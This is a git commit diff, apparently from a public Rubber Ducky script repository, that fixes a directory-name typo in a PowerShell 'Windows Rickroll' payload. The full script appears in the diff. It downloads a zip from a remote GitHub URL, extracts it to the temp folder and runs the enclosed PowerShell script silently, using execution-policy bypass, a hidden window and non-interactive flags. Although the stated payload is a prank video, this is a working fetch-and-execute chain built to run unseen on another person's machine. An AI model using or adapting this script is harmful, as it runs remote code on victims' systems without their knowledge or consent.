7485b7a12349e32e630e6e7ecd52fe0a26c4eef5
Eric <200495807+JestingDart4369@users.noreply.github.com>
2026-06-12 07:50:04 +0000

    Fix typo in directory name for Windows Rickroll script

--- WRV-run.ps1
+++ WRV-run.ps1
@@ -1,5 +1,5 @@
 $U='https://github.com/JestingDart4369/Ducky-script-public/blob/main/Windows-rickroll-vido.zip?raw=true'
 $Z="$env:TMP"+'\Windows-rickroll-vido.zip'
-$D="$env:TMP"+'\Windows-rickroll-vido'
+$D="$env:TMP"+'\Windows-rickroll-video'
 iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
 powershell $D\Windows-rickroll-vido\Windows-rickroll-video-player.ps1 -exec Bypass -w h -NoP -NonI
